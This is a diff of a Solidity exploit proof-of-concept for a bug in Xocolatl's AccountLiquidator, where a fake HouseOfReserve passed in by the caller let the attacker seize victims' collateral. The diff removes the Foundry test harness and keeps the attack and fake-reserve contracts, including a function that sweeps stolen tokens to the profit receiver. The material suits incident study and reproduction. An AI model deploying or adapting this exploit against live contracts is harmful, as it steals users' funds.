@@ -1,8 +1,15 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.15;
 
-import "../basetest.sol";
-import "../interface.sol";
+// Synthetic (standalone) exploit for the Xocolatl AccountLiquidator arbitrary-HouseOfReserve
+// bug, adapted from the real Foundry PoC (registry: 2026-03-XocolatlLiquidator_exp,
+// test/XocolatlLiquidator_exp.sol). The real test wraps the attack in a
+// `ContractTest is BaseTestWithBalanceLog` (forge-std `Test`) harness — this version drops
+// that wrapper entirely and keeps only the two plain, non-Test contracts the real attacker
+// actually deployed on-chain (`XocolatlLiquidationAttack` + `FakeHouseOfReserve`), since the
+// playground's minimal EVM replay has no Foundry VM cheatcode contract deployed and would
+// revert on any EXTCODESIZE probe of it. `IERC20` (from the registry's giant `interface.sol`)
+// is replaced with a minimal inline interface.
 
 // @KeyInfo - Total Lost : 3.25 cbETH and 0.22 WETH
 // Attacker : 0xdb731450e065ea7f6bef6d27e88dd07d6e2d1af5
@@ -11,13 +18,6 @@ import "../interface.sol";
 // Victim : Xocolatl HouseOfReserve vault accounting users
 // Attack Tx : https://basescan.org/tx/0x950f32324039be29007b158c321edf58c0b6742b01ba8d31a8b9a198a1dbbb4c
 
-// @Info
-// Vulnerable Contract Code : https://base.blockscout.com/address/0xeab948ec7ce3f403b63787ba3884aaf43d07ca9c#code
-
-// @Analysis
-// Twitter Guy : https://t.me/defimon_alerts/2834
-// Reference : https://github.com/La-DAO/xocolatl-contracts/blob/10c68fb1bfd41196359bf35b8e0fb97a305898f2/contracts/AccountLiquidator.sol
-//
 // AccountLiquidator.liquidateUser trusted an arbitrary caller-supplied HouseOfReserve. The attacker supplied fake
 // reserves that pointed at the real reserve accounting token IDs while returning a price that rounded the liquidation
 // cost to zero. The liquidator transferred victims' accounting collateral to the attacker, then the attacker withdrew
@@ -41,6 +41,11 @@ uint256 constant WETH_RESERVE_TOKEN_ID =
 uint256 constant WETH_BACKED_TOKEN_ID =
     0x138e1f20a5754931001cc95e3eb6b8b1a5a70ea84981a0253f6053d13a7d533a;
 
+interface IERC20Min {
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
 interface IAccountLiquidator {
     function liquidateUser(address userToLiquidate, address houseOfReserve) external;
 }
@@ -56,49 +61,6 @@ interface IHouseOfReserve {
 interface IPyth {
     function getUpdateFee(bytes[] calldata updateData) external view returns (uint256);
     function updatePriceFeeds(bytes[] calldata updateData) external payable;
-}
-
-contract ContractTest is BaseTestWithBalanceLog {
-    uint256 private constant FORK_BLOCK = 43_801_482;
-    uint256 private constant MIN_CBETH_PROFIT = 3 ether;
-    uint256 private constant MIN_WETH_PROFIT = 0.2 ether;
-
-    function setUp() public {
-        vm.createSelectFork("http://127.0.0.1:8548", FORK_BLOCK);
-        fundingToken = CBETH;
-        multiAssetLog = true;
-        attacker = ATTACKER;
-        _addFundingToken(CBETH);
-        _addFundingToken(WETH_TOKEN);
-
-        vm.label(ATTACKER, "Attacker EOA");
-        vm.label(ACCOUNT_LIQUIDATOR_PROXY, "AccountLiquidator proxy");
-        vm.label(ASSETS_ACCOUNTANT, "AssetsAccountant");
-        vm.label(PYTH, "Pyth");
-        vm.label(CBETH, "cbETH");
-        vm.label(WETH_TOKEN, "WETH");
-        vm.label(CBETH_RESERVE, "cbETH HouseOfReserve");
-        vm.label(WETH_RESERVE, "WETH HouseOfReserve");
-    }
-
-    function testExploit() public balanceLog {
-        uint256 cbEthBefore = IERC20(CBETH).balanceOf(ATTACKER);
-        uint256 wethBefore = IERC20(WETH_TOKEN).balanceOf(ATTACKER);
-
-        XocolatlLiquidationAttack attack = new XocolatlLiquidationAttack(ATTACKER);
-        vm.deal(address(attack), 0.001 ether);
-
-        // step 1: run the fake-reserve liquidation loop and withdraw the seized reserve assets.
-        attack.execute();
-
-        uint256 cbEthProfit = IERC20(CBETH).balanceOf(ATTACKER) - cbEthBefore;
-        uint256 wethProfit = IERC20(WETH_TOKEN).balanceOf(ATTACKER) - wethBefore;
-        logTokenBalance(CBETH, ATTACKER, "Attacker cbETH profit");
-        logTokenBalance(WETH_TOKEN, ATTACKER, "Attacker WETH profit");
-
-        assertGt(cbEthProfit, MIN_CBETH_PROFIT, "cbETH profit");
-        assertGt(wethProfit, MIN_WETH_PROFIT, "WETH profit");
-    }
 }
 
 contract XocolatlLiquidationAttack {
@@ -191,9 +153,9 @@ contract XocolatlLiquidationAttack {
     }
 
     function sweepToken(address token) private {
-        uint256 balance = IERC20(token).balanceOf(address(this));
+        uint256 balance = IERC20Min(token).balanceOf(address(this));
         if (balance > 0) {
-            IERC20(token).transfer(profitReceiver, balance);
+            IERC20Min(token).transfer(profitReceiver, balance);
         }
     }
 
